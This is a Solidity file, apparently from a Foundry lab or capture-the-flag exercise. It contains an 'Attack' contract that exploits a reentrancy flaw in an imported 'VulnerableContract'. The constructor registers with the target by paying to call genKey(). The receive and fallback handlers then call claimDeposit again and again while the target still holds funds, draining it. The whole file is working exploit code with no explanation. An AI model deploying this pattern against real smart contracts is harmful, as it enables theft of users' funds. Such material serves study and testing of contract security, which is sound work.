// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./VulnerableContract.sol";
import {Test, console2} from "forge-std/Test.sol";

contract Attack {
    address payable public owner;
    address payable public target;
    bool public isContract;
    address public contractCheck;
    constructor(address payable targetAddr) payable {
        bytes memory genkeyCall = abi.encodeWithSignature("genKey()");
        (bool success, ) = address(targetAddr).call{value: 0.001 ether}(genkeyCall);
        require(success);
        bytes memory keysAndBalancesAndIsGenKeyCall = abi.encodeWithSignature("keysAndBalancesAndIsGenKey(address)", address(this));
        (bool success2, bytes memory returnData) = address(targetAddr).call(keysAndBalancesAndIsGenKeyCall);
        require(success2);
        (uint256 keys, uint256 balances, bool isGenKey) = abi.decode(returnData, (uint256, uint256, bool));
        if(keys != 5) {
            revert();
        }
        target = targetAddr;
    }
    function claimDeposit() public {
        bytes memory claimDepositCall = abi.encodeWithSignature("claimDeposit(address)", address(this));
        (bool success, ) = address(target).call(claimDepositCall);
        require(success);
    }
    function reentryAttack(address payable _target) public payable {
        require(address(target).balance >= 0.001 ether, "not enough balance");
        VulnerableContract(_target).claimDeposit(address(this));
    }
    receive() external payable {
        reentryAttack(payable(msg.sender));
    }
    fallback() external payable {
        reentryAttack(payable(msg.sender));
    }
}